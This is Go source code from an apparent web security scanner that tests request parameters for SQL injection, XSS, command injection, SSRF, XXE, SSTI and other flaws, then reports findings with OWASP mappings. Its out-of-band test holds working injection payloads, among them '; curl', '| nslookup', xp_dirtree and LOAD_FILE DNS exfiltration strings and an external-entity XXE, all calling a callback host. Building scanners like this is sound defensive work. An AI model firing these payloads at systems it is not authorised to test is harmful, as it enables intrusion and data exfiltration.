package scanner

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/swiss-knife-for-web-security/skws/internal/core"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/cmdi"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/cors"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/crlf"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/idor"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/lfi"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/nosql"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/oob"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/redirect"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/ssrf"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/ssti"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/xss"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/xxe"
	"github.com/swiss-knife-for-web-security/skws/internal/http"
	"github.com/swiss-knife-for-web-security/skws/internal/payloads/sqli"
)

// testSQLiWithClient tests a parameter for SQL injection using the internal detector and provided client.
func (s *InternalScanner) testSQLiWithClient(ctx context.Context, targetURL, param, method string, client *http.Client) []*core.Finding {
	var findings []*core.Finding

	if s.config.Verbose {
		fmt.Printf("[*] Testing SQLi on param '%s'...\n", param)
	}

	// Get payloads from the payloads package
	payloads := sqli.GetPayloads(sqli.Generic)
	if s.config.IncludeWAFBypass {
		payloads = append(payloads, sqli.GetWAFBypassPayloads(sqli.Generic)...)
	}

	// Limit payloads
	if len(payloads) > s.config.MaxPayloadsPerParam {
		payloads = payloads[:s.config.MaxPayloadsPerParam]
	}

	if s.config.Verbose {
		fmt.Printf("[*] Testing %d SQLi payloads...\n", len(payloads))
	}

	// Test each payload
	testedCount := 0
	for _, payload := range payloads {
		select {
		case <-ctx.Done():
			if s.config.Verbose {
				fmt.Printf("[!] SQLi test canceled by context\n")
			}
			return findings
		default:
		}

		// Send payload
		resp, err := client.SendPayload(ctx, targetURL, param, payload.Value, method)
		if err != nil {
			continue
		}
		testedCount++

		// Analyze response for SQLi indicators
		analysis := s.sqliDetector.AnalyzeResponse(resp.Body)
		if analysis.IsVulnerable {
			if s.config.Verbose {
				fmt.Printf("[+] SQLi FOUND in '%s' with payload: %s\n", param, payload.Value[:min(30, len(payload.Value))])
			}
			finding := core.NewFinding("SQL Injection", core.SeverityCritical)
			finding.URL = targetURL
			finding.Parameter = param
			finding.Description = fmt.Sprintf("%s SQL Injection vulnerability detected in '%s' parameter (Database: %s)",
				analysis.DetectionType, param, analysis.DatabaseType)
			finding.Evidence = fmt.Sprintf("Payload: %s\nEvidence: %s", payload.Value, analysis.Evidence)
			finding.Tool = "internal-sqli-detector"
			finding.Remediation = "Use parameterized queries or prepared statements. Never concatenate user input into SQL queries."

			finding.WithOWASPMapping(
				[]string{"WSTG-INPV-05"},
				[]string{"A03:2021"},
				[]string{"CWE-89"},
			)

			findings = append(findings, finding)
			// Stop after first finding for this parameter
			break
		}
	}

	if s.config.Verbose {
		fmt.Printf("[*] SQLi test complete: tested %d payloads, found %d vulns\n", testedCount, len(findings))
	}

	return findings
}

// testXSS tests a parameter for XSS using the internal detector.
func (s *InternalScanner) testXSS(ctx context.Context, targetURL, param, method string) []*core.Finding {
	result, err := s.xssDetector.Detect(ctx, targetURL, param, method, xss.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testOOBWithClient tests a parameter using out-of-band techniques with the provided client.
func (s *InternalScanner) testOOBWithClient(ctx context.Context, targetURL, param, method string, client *http.Client) []*core.Finding {
	if s.oobClient == nil {
		return nil
	}

	var findings []*core.Finding

	// Generate OOB payloads for different vulnerability types
	oobPayloads := []struct {
		payloadType string
		builder     func(url string) string
	}{
		{
			payloadType: oob.PayloadTypeSQLi,
			builder: func(url string) string {
				// Multiple SQLi OOB techniques
				return fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\%s\\x'; --", url)
			},
		},
		{
			payloadType: oob.PayloadTypeSQLi,
			builder: func(url string) string {
				// MySQL DNS exfil
				return fmt.Sprintf("' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.%s\\\\a'))-- ", url)
			},
		},
		{
			payloadType: oob.PayloadTypeSSRF,
			builder: func(url string) string {
				return "http://" + url
			},
		},
		{
			payloadType: oob.PayloadTypeRCE,
			builder: func(url string) string {
				return fmt.Sprintf("; curl http://%s", url)
			},
		},
		{
			payloadType: oob.PayloadTypeRCE,
			builder: func(url string) string {
				return fmt.Sprintf("| nslookup %s", url)
			},
		},
		{
			payloadType: oob.PayloadTypeXXE,
			builder: func(url string) string {
				return fmt.Sprintf(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://%s">]><foo>&xxe;</foo>`, url)
			},
		},
	}

	for _, p := range oobPayloads {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		payload := s.oobClient.GeneratePayload(p.payloadType)
		testPayload := p.builder(payload.DNSPayload())

		// Send payload — errors are expected for malformed payloads, continue to poll for interactions
		if _, err := client.SendPayload(ctx, targetURL, param, testPayload, method); err != nil && s.config.Verbose {
			fmt.Printf("[!] OOB payload send failed for %s: %v\n", p.payloadType, err)
		}
	}

	// Poll for interactions with a reasonable timeout
	pollCtx, cancel := context.WithTimeout(ctx, s.config.OOBPollTimeout)
	defer cancel()

	interactions := s.oobClient.PollWithTimeout(pollCtx, 5*time.Second)

	for _, interaction := range interactions {
		finding := core.NewFinding(
			fmt.Sprintf("Blind %s via OOB", strings.ToUpper(interaction.PayloadType)),
			core.SeverityCritical,
		)
		finding.URL = targetURL
		finding.Parameter = param
		finding.Description = fmt.Sprintf("Out-of-band interaction detected (%s) from %s",
			interaction.Protocol, interaction.RemoteAddr)
		finding.Evidence = interaction.String()
		finding.Tool = "internal-oob"

		// Add OWASP mappings based on payload type
		switch interaction.PayloadType {
		case oob.PayloadTypeSQLi:
			finding.WithOWASPMapping([]string{"WSTG-INPV-05"}, []string{"A03:2021"}, []string{"CWE-89"})
		case oob.PayloadTypeSSRF:
			finding.WithOWASPMapping([]string{"WSTG-INPV-19"}, []string{"A10:2021"}, []string{"CWE-918"})
		case oob.PayloadTypeRCE:
			finding.WithOWASPMapping([]string{"WSTG-INPV-12"}, []string{"A03:2021"}, []string{"CWE-78"})
		case oob.PayloadTypeXXE:
			finding.WithOWASPMapping([]string{"WSTG-INPV-07"}, []string{"A05:2021"}, []string{"CWE-611"})
		}

		findings = append(findings, finding)
	}

	return findings
}

// testCMDI tests a parameter for Command Injection using the internal detector.
func (s *InternalScanner) testCMDI(ctx context.Context, targetURL, param, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing CMDI on param '%s'...\n", param)
	}

	result, err := s.cmdiDetector.Detect(ctx, targetURL, param, method, cmdi.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
		EnableTimeBased:  true,
		TimeBasedDelay:   5 * time.Second,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testSSRF tests a parameter for SSRF using the internal detector.
func (s *InternalScanner) testSSRF(ctx context.Context, targetURL, param, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing SSRF on param '%s'...\n", param)
	}

	result, err := s.ssrfDetector.Detect(ctx, targetURL, param, method, ssrf.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testLFI tests a parameter for LFI/Path Traversal using the internal detector.
func (s *InternalScanner) testLFI(ctx context.Context, targetURL, param, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing LFI on param '%s'...\n", param)
	}

	result, err := s.lfiDetector.Detect(ctx, targetURL, param, method, lfi.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
		TestWrappers:     true,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testXXEInParam tests a parameter for XXE using the internal detector.
func (s *InternalScanner) testXXEInParam(ctx context.Context, targetURL, param, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing XXE on param '%s'...\n", param)
	}

	result, err := s.xxeDetector.DetectInParameter(ctx, targetURL, param, method, xxe.DetectOptions{
		MaxPayloads: s.config.MaxPayloadsPerParam,
		Timeout:     s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testNoSQL tests a parameter for NoSQL Injection using the internal detector.
func (s *InternalScanner) testNoSQL(ctx context.Context, targetURL, param, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing NoSQL Injection on param '%s'...\n", param)
	}

	result, err := s.nosqlDetector.Detect(ctx, targetURL, param, method, nosql.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testSSTI tests a parameter for Server-Side Template Injection.
func (s *InternalScanner) testSSTI(ctx context.Context, targetURL, param, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing SSTI on param '%s'...\n", param)
	}

	result, err := s.sstiDetector.Detect(ctx, targetURL, param, method, ssti.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
		TestAllEngines:   true,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testIDOR tests for Insecure Direct Object Reference vulnerabilities.
func (s *InternalScanner) testIDOR(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing IDOR on '%s'...\n", targetURL)
	}

	result, err := s.idorDetector.Detect(ctx, targetURL, idor.DetectOptions{
		MaxRequests: s.config.MaxPayloadsPerParam,
		Timeout:     s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testRedirect tests a parameter for Open Redirect vulnerabilities.
func (s *InternalScanner) testRedirect(ctx context.Context, targetURL, param, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing Open Redirect on param '%s'...\n", param)
	}

	result, err := s.redirectDetector.Detect(ctx, targetURL, param, method, redirect.DetectOptions{
		MaxPayloads:   s.config.MaxPayloadsPerParam,
		Timeout:       s.config.RequestTimeout,
		IncludeBypass: s.config.IncludeWAFBypass,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testCORS tests for CORS misconfigurations.
func (s *InternalScanner) testCORS(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing CORS on '%s'...\n", targetURL)
	}

	result, err := s.corsDetector.Detect(ctx, targetURL, cors.DetectOptions{
		Timeout:         s.config.RequestTimeout,
		TestCredentials: true,
		TestPreflight:   true,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testCRLF tests a parameter for CRLF Injection vulnerabilities.
func (s *InternalScanner) testCRLF(ctx context.Context, targetURL, param, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing CRLF Injection on param '%s'...\n", param)
	}

	result, err := s.crlfDetector.Detect(ctx, targetURL, param, method, crlf.DetectOptions{
		MaxPayloads:         s.config.MaxPayloadsPerParam,
		Timeout:             s.config.RequestTimeout,
		TestHeaderInjection: true,
		TestResponseSplit:   true,
		IncludeAllEncodings: s.config.IncludeWAFBypass,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testJWT tests JWT tokens for vulnerabilities.
// Note: This requires JWT tokens to be extracted from the target first.
func (s *InternalScanner) testJWT(ctx context.Context, token string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing JWT token for vulnerabilities...\n")
	}

	result, err := s.jwtDetector.Detect(ctx, token, nil)
	if err != nil || !result.HasVulnerabilities() {
		return nil
	}

	var findings []*core.Finding
	for _, jwtFinding := range result.Findings {
		findings = append(findings, jwtFinding.ToCoreFindings(""))
	}

	return findings
}
